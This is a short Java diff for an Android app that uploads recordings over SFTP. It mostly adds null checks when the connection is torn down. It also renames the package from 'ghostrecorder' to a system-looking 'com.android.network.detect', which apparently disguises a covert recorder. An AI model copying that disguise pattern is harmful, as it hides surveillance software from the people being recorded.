@@ -1,4 +1,4 @@
-package com.byteshaft.ghostrecorder;
+package com.android.network.detect;
 
 import android.content.Context;
 import android.content.Intent;
@@ -34,7 +34,6 @@ public class UploadRecordingTask extends AsyncTask<ArrayList<String>, Void, Stri
     private String SFTP_WORKING_DIR;
     private boolean FILE_UPLOADED = false;
     private UploadRecordingTaskHelpers uploadHelpers;
-    private RecordingDatabaseHelper dbHelpers;
 
     public UploadRecordingTask(Context context) {
         super();
@@ -135,12 +134,20 @@ public class UploadRecordingTask extends AsyncTask<ArrayList<String>, Void, Stri
     }
 
     private void disconnectConnection() {
-        mChannelSftp.exit();
-        Log.i("Server", "sftp Channel exited.");
-        mChannel.disconnect();
-        Log.i("Server", "Channel disconnected.");
-        mSession.disconnect();
-        Log.i("Server", "Host Session disconnected.");
+        if (mChannelSftp != null) {
+            mChannelSftp.exit();
+            Log.i("Server", "sftp Channel exited.");
+        }
+
+        if (mChannel != null) {
+            mChannel.disconnect();
+            Log.i("Server", "Channel disconnected.");
+        }
+
+        if (mSession != null) {
+            mSession.disconnect();
+            Log.i("Server", "Host Session disconnected.");
+        }
         ConnectionChangeReceiver.sUploadingPrevious = false;
     }
 }
